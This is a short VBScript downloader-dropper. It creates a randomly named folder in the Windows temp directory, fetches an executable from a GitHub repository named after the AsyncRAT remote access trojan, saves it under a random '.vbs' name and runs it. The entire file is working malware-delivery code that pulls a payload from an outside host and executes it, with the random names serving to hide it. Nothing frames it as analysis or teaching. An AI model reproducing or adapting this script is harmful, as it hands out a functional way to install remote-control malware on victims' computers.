' Function to generate a random string
Function GenerateRandomString(length)
    Dim chars, i, randomString
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    randomString = ""
    Randomize
    For i = 1 To length
        randomString = randomString & Mid(chars, Int((Len(chars) * Rnd) + 1), 1)
    Next
    GenerateRandomString = randomString
End Function

' Define the URL of the file to download
Dim fileUrl
fileUrl = "https://raw.githubusercontent.com/GeyPedofil666/ASYNCRAT/refs/heads/main/Blebebe.exe" ' Replace with your file URL

' Generate a random folder name and script name
Dim randomFolderName, randomScriptName, tempFolderPath, savePath
randomFolderName = GenerateRandomString(10) ' Random folder name of length 10
randomScriptName = GenerateRandomString(10) & ".vbs" ' Random script name of length 10
tempFolderPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\" & randomFolderName

' Create the random folder in the temp directory
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
If Not fso.FolderExists(tempFolderPath) Then
    fso.CreateFolder(tempFolderPath)
End If

' Define the path where the file will be saved
savePath = tempFolderPath & "\" & randomScriptName

' Create a new XMLHTTP object to download the file
Dim http
Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")

' Open the connection to the URL
http.Open "GET", fileUrl, False
http.Send

' Check if the request was successful
If http.Status = 200 Then
    ' Create a binary stream to save the file
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binary
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile savePath, 2 ' Overwrite if exists
    stream.Close

    ' Execute the downloaded file
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run savePath, 1, False
Else
    WScript.Echo "Failed to download file. Status: " & http.Status
End If

' Clean up
Set http = Nothing
Set stream = Nothing
Set shell = Nothing
Set fso = Nothing
